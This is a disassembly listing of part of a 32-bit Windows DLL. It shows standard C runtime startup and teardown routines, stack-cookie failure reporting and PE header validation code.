10001f81:	33 c0                	xor    %eax,%eax
10001f83:	40                   	inc    %eax
10001f84:	5e                   	pop    %esi
10001f85:	c3                   	ret
10001f86:	83 26 00             	andl   $0x0,(%esi)
10001f89:	e8 48 05 00 00       	call   0x100024d6
10001f8e:	68 fc 24 00 10       	push   $0x100024fc
10001f93:	e8 27 05 00 00       	call   0x100024bf
10001f98:	c7 04 24 0e 24 00 10 	movl   $0x1000240e,(%esp)
10001f9f:	e8 1b 05 00 00       	call   0x100024bf
10001fa4:	59                   	pop    %ecx
10001fa5:	33 c0                	xor    %eax,%eax
10001fa7:	5e                   	pop    %esi
10001fa8:	c3                   	ret
10001fa9:	8b ff                	mov    %edi,%edi
10001fab:	55                   	push   %ebp
10001fac:	8b ec                	mov    %esp,%ebp
10001fae:	51                   	push   %ecx
10001faf:	51                   	push   %ecx
10001fb0:	33 c0                	xor    %eax,%eax
10001fb2:	39 45 0c             	cmp    %eax,0xc(%ebp)
10001fb5:	75 0e                	jne    0x10001fc5
10001fb7:	39 05 10 40 00 10    	cmp    %eax,0x10004010
10001fbd:	7e 3c                	jle    0x10001ffb
10001fbf:	ff 0d 10 40 00 10    	decl   0x10004010
10001fc5:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
10001fc9:	8b 0d d8 30 00 10    	mov    0x100030d8,%ecx
10001fcf:	8b 09                	mov    (%ecx),%ecx
10001fd1:	53                   	push   %ebx
10001fd2:	56                   	push   %esi
10001fd3:	57                   	push   %edi
10001fd4:	89 0d 4c 43 00 10    	mov    %ecx,0x1000434c
10001fda:	0f 85 d4 00 00 00    	jne    0x100020b4
10001fe0:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
10001fe7:	8b 79 04             	mov    0x4(%ecx),%edi
10001fea:	8b 35 80 30 00 10    	mov    0x10003080,%esi
10001ff0:	89 45 0c             	mov    %eax,0xc(%ebp)
10001ff3:	50                   	push   %eax
10001ff4:	bb 54 43 00 10       	mov    $0x10004354,%ebx
10001ff9:	eb 18                	jmp    0x10002013
10001ffb:	33 c0                	xor    %eax,%eax
10001ffd:	e9 c9 01 00 00       	jmp    0x100021cb
10002002:	3b c7                	cmp    %edi,%eax
10002004:	74 17                	je     0x1000201d
10002006:	68 e8 03 00 00       	push   $0x3e8
1000200b:	ff 15 54 30 00 10    	call   *0x10003054
10002011:	6a 00                	push   $0x0
10002013:	57                   	push   %edi
10002014:	53                   	push   %ebx
10002015:	ff d6                	call   *%esi
10002017:	85 c0                	test   %eax,%eax
10002019:	75 e7                	jne    0x10002002
1000201b:	eb 07                	jmp    0x10002024
1000201d:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
10002024:	a1 50 43 00 10       	mov    0x10004350,%eax
10002029:	6a 02                	push   $0x2
1000202b:	5e                   	pop    %esi
1000202c:	85 c0                	test   %eax,%eax
1000202e:	74 09                	je     0x10002039
10002030:	6a 1f                	push   $0x1f
10002032:	e8 53 06 00 00       	call   0x1000268a
10002037:	eb 3c                	jmp    0x10002075
10002039:	68 44 31 00 10       	push   $0x10003144
1000203e:	68 3c 31 00 10       	push   $0x1000313c
10002043:	c7 05 50 43 00 10 01 	movl   $0x1,0x10004350
1000204a:	00 00 00 
1000204d:	e8 32 06 00 00       	call   0x10002684
10002052:	59                   	pop    %ecx
10002053:	59                   	pop    %ecx
10002054:	85 c0                	test   %eax,%eax
10002056:	74 07                	je     0x1000205f
10002058:	33 c0                	xor    %eax,%eax
1000205a:	e9 69 01 00 00       	jmp    0x100021c8
1000205f:	68 38 31 00 10       	push   $0x10003138
10002064:	68 34 31 00 10       	push   $0x10003134
10002069:	e8 10 06 00 00       	call   0x1000267e
1000206e:	59                   	pop    %ecx
1000206f:	89 35 50 43 00 10    	mov    %esi,0x10004350
10002075:	33 ff                	xor    %edi,%edi
10002077:	59                   	pop    %ecx
10002078:	39 7d 0c             	cmp    %edi,0xc(%ebp)
1000207b:	75 08                	jne    0x10002085
1000207d:	57                   	push   %edi
1000207e:	53                   	push   %ebx
1000207f:	ff 15 84 30 00 10    	call   *0x10003084
10002085:	39 3d 60 43 00 10    	cmp    %edi,0x10004360
1000208b:	74 1c                	je     0x100020a9
1000208d:	68 60 43 00 10       	push   $0x10004360
10002092:	e8 29 05 00 00       	call   0x100025c0
10002097:	59                   	pop    %ecx
10002098:	85 c0                	test   %eax,%eax
1000209a:	74 0d                	je     0x100020a9
1000209c:	ff 75 10             	push   0x10(%ebp)
1000209f:	56                   	push   %esi
100020a0:	ff 75 08             	push   0x8(%ebp)
100020a3:	ff 15 60 43 00 10    	call   *0x10004360
100020a9:	ff 05 10 40 00 10    	incl   0x10004010
100020af:	e9 11 01 00 00       	jmp    0x100021c5
100020b4:	39 45 0c             	cmp    %eax,0xc(%ebp)
100020b7:	0f 85 08 01 00 00    	jne    0x100021c5
100020bd:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
100020c3:	8b 78 04             	mov    0x4(%eax),%edi
100020c6:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100020ca:	8b 35 80 30 00 10    	mov    0x10003080,%esi
100020d0:	bb 54 43 00 10       	mov    $0x10004354,%ebx
100020d5:	eb 0f                	jmp    0x100020e6
100020d7:	3b c7                	cmp    %edi,%eax
100020d9:	74 17                	je     0x100020f2
100020db:	68 e8 03 00 00       	push   $0x3e8
100020e0:	ff 15 54 30 00 10    	call   *0x10003054
100020e6:	6a 00                	push   $0x0
100020e8:	57                   	push   %edi
100020e9:	53                   	push   %ebx
100020ea:	ff d6                	call   *%esi
100020ec:	85 c0                	test   %eax,%eax
100020ee:	75 e7                	jne    0x100020d7
100020f0:	eb 07                	jmp    0x100020f9
100020f2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
100020f9:	a1 50 43 00 10       	mov    0x10004350,%eax
100020fe:	83 f8 02             	cmp    $0x2,%eax
10002101:	74 0d                	je     0x10002110
10002103:	6a 1f                	push   $0x1f
10002105:	e8 80 05 00 00       	call   0x1000268a
1000210a:	59                   	pop    %ecx
1000210b:	e9 b5 00 00 00       	jmp    0x100021c5
10002110:	ff 35 5c 43 00 10    	push   0x1000435c
10002116:	8b 35 c8 30 00 10    	mov    0x100030c8,%esi
1000211c:	ff d6                	call   *%esi
1000211e:	59                   	pop    %ecx
1000211f:	89 45 0c             	mov    %eax,0xc(%ebp)
10002122:	85 c0                	test   %eax,%eax
10002124:	0f 84 87 00 00 00    	je     0x100021b1
1000212a:	ff 35 58 43 00 10    	push   0x10004358
10002130:	ff d6                	call   *%esi
10002132:	8b f8                	mov    %eax,%edi
10002134:	8b 45 0c             	mov    0xc(%ebp),%eax
10002137:	59                   	pop    %ecx
10002138:	89 45 10             	mov    %eax,0x10(%ebp)
1000213b:	89 7d 08             	mov    %edi,0x8(%ebp)
1000213e:	83 ef 04             	sub    $0x4,%edi
10002141:	3b 7d 0c             	cmp    0xc(%ebp),%edi
10002144:	72 51                	jb     0x10002197
10002146:	83 3f 00             	cmpl   $0x0,(%edi)
10002149:	74 f3                	je     0x1000213e
1000214b:	ff 15 c4 30 00 10    	call   *0x100030c4
10002151:	39 07                	cmp    %eax,(%edi)
10002153:	74 e9                	je     0x1000213e
10002155:	ff 37                	push   (%edi)
10002157:	ff d6                	call   *%esi
10002159:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000215c:	ff 15 c4 30 00 10    	call   *0x100030c4
10002162:	89 07                	mov    %eax,(%edi)
10002164:	ff 55 f8             	call   *-0x8(%ebp)
10002167:	ff 35 5c 43 00 10    	push   0x1000435c
1000216d:	ff d6                	call   *%esi
1000216f:	ff 35 58 43 00 10    	push   0x10004358
10002175:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002178:	ff d6                	call   *%esi
1000217a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
1000217d:	83 c4 0c             	add    $0xc,%esp
10002180:	39 4d 10             	cmp    %ecx,0x10(%ebp)
10002183:	75 05                	jne    0x1000218a
10002185:	39 45 08             	cmp    %eax,0x8(%ebp)
10002188:	74 b4                	je     0x1000213e
1000218a:	89 4d 10             	mov    %ecx,0x10(%ebp)
1000218d:	89 4d 0c             	mov    %ecx,0xc(%ebp)
10002190:	89 45 08             	mov    %eax,0x8(%ebp)
10002193:	8b f8                	mov    %eax,%edi
10002195:	eb a7                	jmp    0x1000213e
10002197:	ff 75 0c             	push   0xc(%ebp)
1000219a:	ff 15 c0 30 00 10    	call   *0x100030c0
100021a0:	59                   	pop    %ecx
100021a1:	ff 15 c4 30 00 10    	call   *0x100030c4
100021a7:	a3 58 43 00 10       	mov    %eax,0x10004358
100021ac:	a3 5c 43 00 10       	mov    %eax,0x1000435c
100021b1:	33 c0                	xor    %eax,%eax
100021b3:	a3 50 43 00 10       	mov    %eax,0x10004350
100021b8:	39 45 fc             	cmp    %eax,-0x4(%ebp)
100021bb:	75 08                	jne    0x100021c5
100021bd:	50                   	push   %eax
100021be:	53                   	push   %ebx
100021bf:	ff 15 84 30 00 10    	call   *0x10003084
100021c5:	33 c0                	xor    %eax,%eax
100021c7:	40                   	inc    %eax
100021c8:	5f                   	pop    %edi
100021c9:	5e                   	pop    %esi
100021ca:	5b                   	pop    %ebx
100021cb:	c9                   	leave
100021cc:	c2 0c 00             	ret    $0xc
100021cf:	6a 10                	push   $0x10
100021d1:	68 28 33 00 10       	push   $0x10003328
100021d6:	e8 bd 04 00 00       	call   0x10002698
100021db:	8b f9                	mov    %ecx,%edi
100021dd:	8b f2                	mov    %edx,%esi
100021df:	8b 5d 08             	mov    0x8(%ebp),%ebx
100021e2:	33 c0                	xor    %eax,%eax
100021e4:	40                   	inc    %eax
100021e5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
100021e8:	33 c9                	xor    %ecx,%ecx
100021ea:	89 4d fc             	mov    %ecx,-0x4(%ebp)
100021ed:	89 35 08 40 00 10    	mov    %esi,0x10004008
100021f3:	89 45 fc             	mov    %eax,-0x4(%ebp)
100021f6:	3b f1                	cmp    %ecx,%esi
100021f8:	75 10                	jne    0x1000220a
100021fa:	39 0d 10 40 00 10    	cmp    %ecx,0x10004010
10002200:	75 08                	jne    0x1000220a
10002202:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
10002205:	e9 b7 00 00 00       	jmp    0x100022c1
1000220a:	3b f0                	cmp    %eax,%esi
1000220c:	74 05                	je     0x10002213
1000220e:	83 fe 02             	cmp    $0x2,%esi
10002211:	75 2e                	jne    0x10002241
10002213:	a1 6c 31 00 10       	mov    0x1000316c,%eax
10002218:	3b c1                	cmp    %ecx,%eax
1000221a:	74 08                	je     0x10002224
1000221c:	57                   	push   %edi
1000221d:	56                   	push   %esi
1000221e:	53                   	push   %ebx
1000221f:	ff d0                	call   *%eax
10002221:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002224:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
10002228:	0f 84 93 00 00 00    	je     0x100022c1
1000222e:	57                   	push   %edi
1000222f:	56                   	push   %esi
10002230:	53                   	push   %ebx
10002231:	e8 73 fd ff ff       	call   0x10001fa9
10002236:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002239:	85 c0                	test   %eax,%eax
1000223b:	0f 84 80 00 00 00    	je     0x100022c1
10002241:	57                   	push   %edi
10002242:	56                   	push   %esi
10002243:	53                   	push   %ebx
10002244:	e8 af ee ff ff       	call   0x100010f8
10002249:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000224c:	83 fe 01             	cmp    $0x1,%esi
1000224f:	75 24                	jne    0x10002275
10002251:	85 c0                	test   %eax,%eax
10002253:	75 20                	jne    0x10002275
10002255:	57                   	push   %edi
10002256:	50                   	push   %eax
10002257:	53                   	push   %ebx
10002258:	e8 9b ee ff ff       	call   0x100010f8
1000225d:	57                   	push   %edi
1000225e:	6a 00                	push   $0x0
10002260:	53                   	push   %ebx
10002261:	e8 43 fd ff ff       	call   0x10001fa9
10002266:	a1 6c 31 00 10       	mov    0x1000316c,%eax
1000226b:	85 c0                	test   %eax,%eax
1000226d:	74 06                	je     0x10002275
1000226f:	57                   	push   %edi
10002270:	6a 00                	push   $0x0
10002272:	53                   	push   %ebx
10002273:	ff d0                	call   *%eax
10002275:	85 f6                	test   %esi,%esi
10002277:	74 05                	je     0x1000227e
10002279:	83 fe 03             	cmp    $0x3,%esi
1000227c:	75 43                	jne    0x100022c1
1000227e:	57                   	push   %edi
1000227f:	56                   	push   %esi
10002280:	53                   	push   %ebx
10002281:	e8 23 fd ff ff       	call   0x10001fa9
10002286:	85 c0                	test   %eax,%eax
10002288:	75 03                	jne    0x1000228d
1000228a:	21 45 e4             	and    %eax,-0x1c(%ebp)
1000228d:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
10002291:	74 2e                	je     0x100022c1
10002293:	a1 6c 31 00 10       	mov    0x1000316c,%eax
10002298:	85 c0                	test   %eax,%eax
1000229a:	74 25                	je     0x100022c1
1000229c:	57                   	push   %edi
1000229d:	56                   	push   %esi
1000229e:	53                   	push   %ebx
1000229f:	ff d0                	call   *%eax
100022a1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
100022a4:	eb 1b                	jmp    0x100022c1
100022a6:	8b 45 ec             	mov    -0x14(%ebp),%eax
100022a9:	8b 08                	mov    (%eax),%ecx
100022ab:	8b 09                	mov    (%ecx),%ecx
100022ad:	89 4d e0             	mov    %ecx,-0x20(%ebp)
100022b0:	50                   	push   %eax
100022b1:	51                   	push   %ecx
100022b2:	e8 d9 03 00 00       	call   0x10002690
100022b7:	59                   	pop    %ecx
100022b8:	59                   	pop    %ecx
100022b9:	c3                   	ret
100022ba:	8b 65 e8             	mov    -0x18(%ebp),%esp
100022bd:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
100022c1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100022c5:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100022cc:	e8 09 00 00 00       	call   0x100022da
100022d1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
100022d4:	e8 04 04 00 00       	call   0x100026dd
100022d9:	c3                   	ret
100022da:	c7 05 08 40 00 10 ff 	movl   $0xffffffff,0x10004008
100022e1:	ff ff ff 
100022e4:	c3                   	ret
100022e5:	8b ff                	mov    %edi,%edi
100022e7:	55                   	push   %ebp
100022e8:	8b ec                	mov    %esp,%ebp
100022ea:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
100022ee:	75 05                	jne    0x100022f5
100022f0:	e8 21 04 00 00       	call   0x10002716
100022f5:	ff 75 08             	push   0x8(%ebp)
100022f8:	8b 4d 10             	mov    0x10(%ebp),%ecx
100022fb:	8b 55 0c             	mov    0xc(%ebp),%edx
100022fe:	e8 cc fe ff ff       	call   0x100021cf
10002303:	59                   	pop    %ecx
10002304:	5d                   	pop    %ebp
10002305:	c2 0c 00             	ret    $0xc
10002308:	8b ff                	mov    %edi,%edi
1000230a:	55                   	push   %ebp
1000230b:	8b ec                	mov    %esp,%ebp
1000230d:	81 ec 28 03 00 00    	sub    $0x328,%esp
10002313:	a3 20 41 00 10       	mov    %eax,0x10004120
10002318:	89 0d 1c 41 00 10    	mov    %ecx,0x1000411c
1000231e:	89 15 18 41 00 10    	mov    %edx,0x10004118
10002324:	89 1d 14 41 00 10    	mov    %ebx,0x10004114
1000232a:	89 35 10 41 00 10    	mov    %esi,0x10004110
10002330:	89 3d 0c 41 00 10    	mov    %edi,0x1000410c
10002336:	66 8c 15 38 41 00 10 	data16 mov %ss,0x10004138
1000233d:	66 8c 0d 2c 41 00 10 	data16 mov %cs,0x1000412c
10002344:	66 8c 1d 08 41 00 10 	data16 mov %ds,0x10004108
1000234b:	66 8c 05 04 41 00 10 	data16 mov %es,0x10004104
10002352:	66 8c 25 00 41 00 10 	data16 mov %fs,0x10004100
10002359:	66 8c 2d fc 40 00 10 	data16 mov %gs,0x100040fc
10002360:	9c                   	pushf
10002361:	8f 05 30 41 00 10    	pop    0x10004130
10002367:	8b 45 00             	mov    0x0(%ebp),%eax
1000236a:	a3 24 41 00 10       	mov    %eax,0x10004124
1000236f:	8b 45 04             	mov    0x4(%ebp),%eax
10002372:	a3 28 41 00 10       	mov    %eax,0x10004128
10002377:	8d 45 08             	lea    0x8(%ebp),%eax
1000237a:	a3 34 41 00 10       	mov    %eax,0x10004134
1000237f:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
10002385:	c7 05 70 40 00 10 01 	movl   $0x10001,0x10004070
1000238c:	00 01 00 
1000238f:	a1 28 41 00 10       	mov    0x10004128,%eax
10002394:	a3 24 40 00 10       	mov    %eax,0x10004024
10002399:	c7 05 18 40 00 10 09 	movl   $0xc0000409,0x10004018
100023a0:	04 00 c0 
100023a3:	c7 05 1c 40 00 10 01 	movl   $0x1,0x1000401c
100023aa:	00 00 00 
100023ad:	a1 00 40 00 10       	mov    0x10004000,%eax
100023b2:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
100023b8:	a1 04 40 00 10       	mov    0x10004004,%eax
100023bd:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
100023c3:	ff 15 68 30 00 10    	call   *0x10003068
100023c9:	a3 68 40 00 10       	mov    %eax,0x10004068
100023ce:	6a 01                	push   $0x1
100023d0:	e8 d7 03 00 00       	call   0x100027ac
100023d5:	59                   	pop    %ecx
100023d6:	6a 00                	push   $0x0
100023d8:	ff 15 6c 30 00 10    	call   *0x1000306c
100023de:	68 70 31 00 10       	push   $0x10003170
100023e3:	ff 15 78 30 00 10    	call   *0x10003078
100023e9:	83 3d 68 40 00 10 00 	cmpl   $0x0,0x10004068
100023f0:	75 08                	jne    0x100023fa
100023f2:	6a 01                	push   $0x1
100023f4:	e8 b3 03 00 00       	call   0x100027ac
100023f9:	59                   	pop    %ecx
100023fa:	68 09 04 00 c0       	push   $0xc0000409
100023ff:	ff 15 44 30 00 10    	call   *0x10003044
10002405:	50                   	push   %eax
10002406:	ff 15 7c 30 00 10    	call   *0x1000307c
1000240c:	c9                   	leave
1000240d:	c3                   	ret
1000240e:	68 3c 43 00 10       	push   $0x1000433c
10002413:	e8 9a 03 00 00       	call   0x100027b2
10002418:	59                   	pop    %ecx
10002419:	c3                   	ret
1000241a:	6a 14                	push   $0x14
1000241c:	68 50 33 00 10       	push   $0x10003350
10002421:	e8 72 02 00 00       	call   0x10002698
10002426:	ff 35 5c 43 00 10    	push   0x1000435c
1000242c:	8b 35 c8 30 00 10    	mov    0x100030c8,%esi
10002432:	ff d6                	call   *%esi
10002434:	59                   	pop    %ecx
10002435:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002438:	83 f8 ff             	cmp    $0xffffffff,%eax
1000243b:	75 0c                	jne    0x10002449
1000243d:	ff 75 08             	push   0x8(%ebp)
10002440:	ff 15 98 30 00 10    	call   *0x10003098
10002446:	59                   	pop    %ecx
10002447:	eb 67                	jmp    0x100024b0
10002449:	6a 08                	push   $0x8
1000244b:	e8 74 03 00 00       	call   0x100027c4
10002450:	59                   	pop    %ecx
10002451:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10002455:	ff 35 5c 43 00 10    	push   0x1000435c
1000245b:	ff d6                	call   *%esi
1000245d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002460:	ff 35 58 43 00 10    	push   0x10004358
10002466:	ff d6                	call   *%esi
10002468:	59                   	pop    %ecx
10002469:	59                   	pop    %ecx
1000246a:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000246d:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002470:	50                   	push   %eax
10002471:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10002474:	50                   	push   %eax
10002475:	ff 75 08             	push   0x8(%ebp)
10002478:	8b 35 b8 30 00 10    	mov    0x100030b8,%esi
1000247e:	ff d6                	call   *%esi
10002480:	59                   	pop    %ecx
10002481:	50                   	push   %eax
10002482:	e8 37 03 00 00       	call   0x100027be
10002487:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000248a:	ff 75 e4             	push   -0x1c(%ebp)
1000248d:	ff d6                	call   *%esi
1000248f:	a3 5c 43 00 10       	mov    %eax,0x1000435c
10002494:	ff 75 e0             	push   -0x20(%ebp)
10002497:	ff d6                	call   *%esi
10002499:	83 c4 14             	add    $0x14,%esp
1000249c:	a3 58 43 00 10       	mov    %eax,0x10004358
100024a1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100024a8:	e8 09 00 00 00       	call   0x100024b6
100024ad:	8b 45 dc             	mov    -0x24(%ebp),%eax
100024b0:	e8 28 02 00 00       	call   0x100026dd
100024b5:	c3                   	ret
100024b6:	6a 08                	push   $0x8
100024b8:	e8 fb 02 00 00       	call   0x100027b8
100024bd:	59                   	pop    %ecx
100024be:	c3                   	ret
100024bf:	8b ff                	mov    %edi,%edi
100024c1:	55                   	push   %ebp
100024c2:	8b ec                	mov    %esp,%ebp
100024c4:	ff 75 08             	push   0x8(%ebp)
100024c7:	e8 4e ff ff ff       	call   0x1000241a
100024cc:	f7 d8                	neg    %eax
100024ce:	1b c0                	sbb    %eax,%eax
100024d0:	f7 d8                	neg    %eax
100024d2:	59                   	pop    %ecx
100024d3:	48                   	dec    %eax
100024d4:	5d                   	pop    %ebp
100024d5:	c3                   	ret
100024d6:	8b ff                	mov    %edi,%edi
100024d8:	56                   	push   %esi
100024d9:	b8 18 33 00 10       	mov    $0x10003318,%eax
100024de:	be 18 33 00 10       	mov    $0x10003318,%esi
100024e3:	57                   	push   %edi
100024e4:	8b f8                	mov    %eax,%edi
100024e6:	3b c6                	cmp    %esi,%eax
100024e8:	73 0f                	jae    0x100024f9
100024ea:	8b 07                	mov    (%edi),%eax
100024ec:	85 c0                	test   %eax,%eax
100024ee:	74 02                	je     0x100024f2
100024f0:	ff d0                	call   *%eax
100024f2:	83 c7 04             	add    $0x4,%edi
100024f5:	3b fe                	cmp    %esi,%edi
100024f7:	72 f1                	jb     0x100024ea
100024f9:	5f                   	pop    %edi
100024fa:	5e                   	pop    %esi
100024fb:	c3                   	ret
100024fc:	8b ff                	mov    %edi,%edi
100024fe:	56                   	push   %esi
100024ff:	b8 20 33 00 10       	mov    $0x10003320,%eax
10002504:	be 20 33 00 10       	mov    $0x10003320,%esi
10002509:	57                   	push   %edi
1000250a:	8b f8                	mov    %eax,%edi
1000250c:	3b c6                	cmp    %esi,%eax
1000250e:	73 0f                	jae    0x1000251f
10002510:	8b 07                	mov    (%edi),%eax
10002512:	85 c0                	test   %eax,%eax
10002514:	74 02                	je     0x10002518
10002516:	ff d0                	call   *%eax
10002518:	83 c7 04             	add    $0x4,%edi
1000251b:	3b fe                	cmp    %esi,%edi
1000251d:	72 f1                	jb     0x10002510
1000251f:	5f                   	pop    %edi
10002520:	5e                   	pop    %esi
10002521:	c3                   	ret
10002522:	cc                   	int3
10002523:	cc                   	int3
10002524:	cc                   	int3
10002525:	cc                   	int3
10002526:	cc                   	int3
10002527:	cc                   	int3
10002528:	cc                   	int3
10002529:	cc                   	int3
1000252a:	cc                   	int3
1000252b:	cc                   	int3
1000252c:	cc                   	int3
1000252d:	cc                   	int3
1000252e:	cc                   	int3
1000252f:	cc                   	int3
10002530:	8b ff                	mov    %edi,%edi
10002532:	55                   	push   %ebp
10002533:	8b ec                	mov    %esp,%ebp
10002535:	8b 4d 08             	mov    0x8(%ebp),%ecx
10002538:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
1000253d:	66 39 01             	cmp    %ax,(%ecx)
10002540:	74 04                	je     0x10002546
10002542:	33 c0                	xor    %eax,%eax
10002544:	5d                   	pop    %ebp
10002545:	c3                   	ret
10002546:	8b 41 3c             	mov    0x3c(%ecx),%eax
10002549:	03 c1                	add    %ecx,%eax
1000254b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
10002551:	75 ef                	jne    0x10002542
10002553:	33 d2                	xor    %edx,%edx
10002555:	b9 0b 01 00 00       	mov    $0x10b,%ecx
1000255a:	66 39 48 18          	cmp    %cx,0x18(%eax)
1000255e:	0f 94 c2             	sete   %dl
10002561:	8b c2                	mov    %edx,%eax
10002563:	5d                   	pop    %ebp
10002564:	c3                   	ret
10002565:	cc                   	int3
10002566:	cc                   	int3
10002567:	cc                   	int3
10002568:	cc                   	int3
10002569:	cc                   	int3
1000256a:	cc                   	int3
1000256b:	cc                   	int3
1000256c:	cc                   	int3
1000256d:	cc                   	int3
1000256e:	cc                   	int3
1000256f:	cc                   	int3
10002570:	8b ff                	mov    %edi,%edi
10002572:	55                   	push   %ebp
10002573:	8b ec                	mov    %esp,%ebp
10002575:	8b 45 08             	mov    0x8(%ebp),%eax
10002578:	8b 48 3c             	mov    0x3c(%eax),%ecx
1000257b:	03 c8                	add    %eax,%ecx
1000257d:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
10002581:	53                   	push   %ebx
10002582:	56                   	push   %esi
10002583:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
10002587:	33 d2                	xor    %edx,%edx
10002589:	57                   	push   %edi
1000258a:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
1000258e:	85 f6                	test   %esi,%esi
10002590:	76 1b                	jbe    0x100025ad
10002592:	8b 7d 0c             	mov    0xc(%ebp),%edi
10002595:	8b 48 0c             	mov    0xc(%eax),%ecx
10002598:	3b f9                	cmp    %ecx,%edi
1000259a:	72 09                	jb     0x100025a5
1000259c:	8b 58 08             	mov    0x8(%eax),%ebx
1000259f:	03 d9                	add    %ecx,%ebx
100025a1:	3b fb                	cmp    %ebx,%edi
100025a3:	72 0a                	jb     0x100025af
100025a5:	42                   	inc    %edx
100025a6:	83 c0 28             	add    $0x28,%eax
100025a9:	3b d6                	cmp    %esi,%edx
100025ab:	72 e8                	jb     0x10002595
100025ad:	33 c0                	xor    %eax,%eax
100025af:	5f                   	pop    %edi
100025b0:	5e                   	pop    %esi
100025b1:	5b                   	pop    %ebx
100025b2:	5d                   	pop    %ebp
100025b3:	c3                   	ret
100025b4:	cc                   	int3
100025b5:	cc                   	int3
100025b6:	cc                   	int3
100025b7:	cc                   	int3
100025b8:	cc                   	int3
100025b9:	cc                   	int3
100025ba:	cc                   	int3
100025bb:	cc                   	int3
100025bc:	cc                   	int3
100025bd:	cc                   	int3
100025be:	cc                   	int3
100025bf:	cc                   	int3
100025c0:	8b ff                	mov    %edi,%edi
100025c2:	55                   	push   %ebp
100025c3:	8b ec                	mov    %esp,%ebp
100025c5:	6a fe                	push   $0xfffffffe
100025c7:	68 70 33 00 10       	push   $0x10003370
100025cc:	68 f1 26 00 10       	push   $0x100026f1
100025d1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100025d7:	50                   	push   %eax
100025d8:	83 ec 08             	sub    $0x8,%esp
100025db:	53                   	push   %ebx
100025dc:	56                   	push   %esi
100025dd:	57                   	push   %edi
100025de:	a1 00 40 00 10       	mov    0x10004000,%eax
100025e3:	31 45 f8             	xor    %eax,-0x8(%ebp)
100025e6:	33 c5                	xor    %ebp,%eax
100025e8:	50                   	push   %eax
100025e9:	8d 45 f0             	lea    -0x10(%ebp),%eax
100025ec:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
100025f2:	89 65 e8             	mov    %esp,-0x18(%ebp)
100025f5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
100025fc:	68 00 00 00 10       	push   $0x10000000
10002601:	e8 2a ff ff ff       	call   0x10002530
10002606:	83 c4 04             	add    $0x4,%esp
10002609:	85 c0                	test   %eax,%eax
1000260b:	74 55                	je     0x10002662
1000260d:	8b 45 08             	mov    0x8(%ebp),%eax
10002610:	2d 00 00 00 10       	sub    $0x10000000,%eax
10002615:	50                   	push   %eax
10002616:	68 00 00 00 10       	push   $0x10000000
1000261b:	e8 50 ff ff ff       	call   0x10002570
10002620:	83 c4 08             	add    $0x8,%esp
10002623:	85 c0                	test   %eax,%eax
10002625:	74 3b                	je     0x10002662
10002627:	8b 40 24             	mov    0x24(%eax),%eax
1000262a:	c1 e8 1f             	shr    $0x1f,%eax
1000262d:	f7 d0                	not    %eax
1000262f:	83 e0 01             	and    $0x1,%eax
10002632:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10002639:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000263c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10002643:	59                   	pop    %ecx
10002644:	5f                   	pop    %edi
10002645:	5e                   	pop    %esi
10002646:	5b                   	pop    %ebx
10002647:	8b e5                	mov    %ebp,%esp
10002649:	5d                   	pop    %ebp
1000264a:	c3                   	ret
1000264b:	8b 45 ec             	mov    -0x14(%ebp),%eax
1000264e:	8b 08                	mov    (%eax),%ecx
10002650:	8b 01                	mov    (%ecx),%eax
10002652:	33 d2                	xor    %edx,%edx
10002654:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
10002659:	0f 94 c2             	sete   %dl
1000265c:	8b c2                	mov    %edx,%eax
1000265e:	c3                   	ret
1000265f:	8b 65 e8             	mov    -0x18(%ebp),%esp
10002662:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10002669:	33 c0                	xor    %eax,%eax
1000266b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000266e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10002675:	59                   	pop    %ecx
10002676:	5f                   	pop    %edi
10002677:	5e                   	pop    %esi
10002678:	5b                   	pop    %ebx
10002679:	8b e5                	mov    %ebp,%esp
1000267b:	5d                   	pop    %ebp
1000267c:	c3                   	ret
1000267d:	cc                   	int3
1000267e:	ff 25 cc 30 00 10    	jmp    *0x100030cc
